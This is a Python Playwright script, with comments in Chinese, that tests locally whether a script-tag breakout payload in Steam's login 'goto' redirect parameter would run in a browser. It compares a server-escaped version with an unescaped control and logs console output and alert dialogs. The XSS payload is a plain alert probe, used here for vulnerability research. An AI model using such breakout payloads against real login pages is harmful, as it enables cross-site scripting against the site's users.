# -*- coding: utf-8 -*-
"""
本地验证 Steam /login/home/?goto= 注入点的浏览器解析行为
场景 A: 真实响应(服务器把 / 转义为 \/)
场景 B: 对照(无转义版本,证明方法论正确)
"""
import asyncio, os
from playwright.async_api import async_playwright

SCEN_A = r'''<!DOCTYPE html>
<html><head><title>A</title></head><body>
<script language="Javascript">
        function StartLogin()
        {
                var LoginManager = { strRedirectURL: "https:\/\/steamcommunity.com\/<\/script><script>alert(document.domain)<\/script>" };
                console.log('A: JS_STRING_PARSED_OK');
        }
        StartLogin();
        console.log('A: AFTER_STARTLOGIN');
</script>
<script>console.log('A: SECOND_BLOCK_EXECUTED')</script>
</body></html>
'''

SCEN_B = r'''<!DOCTYPE html>
<html><head><title>B</title></head><body>
<script language="Javascript">
        function StartLogin()
        {
                var LoginManager = { strRedirectURL: "https://steamcommunity.com/</script><script>alert(document.domain)</script>" };
                console.log('B: JS_STRING_PARSED_OK');
        }
        StartLogin();
        console.log('B: AFTER_STARTLOGIN');
</script>
<script>console.log('B: SECOND_BLOCK_EXECUTED')</script>
</body></html>
'''

async def run_scenario(p, path, name):
    browser = await p.chromium.launch()
    page = await browser.new_page()
    msgs, dialogs = [], []
    page.on('console', lambda m: msgs.append(m.text))
    page.on('pageerror', lambda e: msgs.append('PAGEERROR: ' + str(e)))
    page.on('dialog', lambda d: (dialogs.append(d.message), d.accept()))
    await page.goto('file:///' + path.replace('\\', '/'))
    await page.wait_for_timeout(1500)
    print(f'===== {name} =====')
    for m in msgs:
        print('  ', m)
    print(f'  dialogs (alert): {dialogs if dialogs else "NONE"}')
    await browser.close()

async def main():
    os.makedirs('_valve_js', exist_ok=True)
    pa = os.path.abspath('_valve_js/poc_local_A.html')
    pb = os.path.abspath('_valve_js/poc_local_B.html')
    with open(pa, 'w', encoding='utf-8') as f:
        f.write(SCEN_A)
    with open(pb, 'w', encoding='utf-8') as f:
        f.write(SCEN_B)
    async with async_playwright() as p:
        await run_scenario(p, pa, '场景A: 真实响应(/ 转义为 \\/)')
        await run_scenario(p, pb, '场景B: 对照(无转义)')

asyncio.run(main())
